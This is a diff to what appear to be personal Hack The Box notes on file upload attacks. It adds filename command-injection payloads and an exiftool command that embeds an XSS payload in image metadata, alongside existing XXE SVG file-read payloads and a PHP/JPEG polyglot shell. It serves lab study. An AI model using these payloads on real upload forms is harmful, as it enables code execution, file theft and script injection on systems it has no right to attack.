@@ -105,7 +105,10 @@ shell3.svg
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resourc>
 <svg>&xxe;</svg>
 ```
-
+### inject filename
+```
+ file$(whoami).jpg or file`whoami`.jpg or file.jpg||whoami,
+```
 ## Skills Assessment - File Upload Attacks
 
 shell.svg
@@ -121,7 +124,12 @@ shell2.svg
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=common-functions.php"> ]>
 <svg>&xxe;</svg>
 ```
-
+```
+[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+[/htb]$ exiftool HTB.jpg
+...SNIP...
+Comment                         :  "><img src=1 onerror=alert(window.origin)>
+```
 shell.phar.jpeg
 ```php
 ����^@^PJFIF^@^A^A^A^A,^A,^@^@��^@dExif^@^@II*^@^H^@^@^@^B^@^N^A^B^@-^@^@^@&^@^>
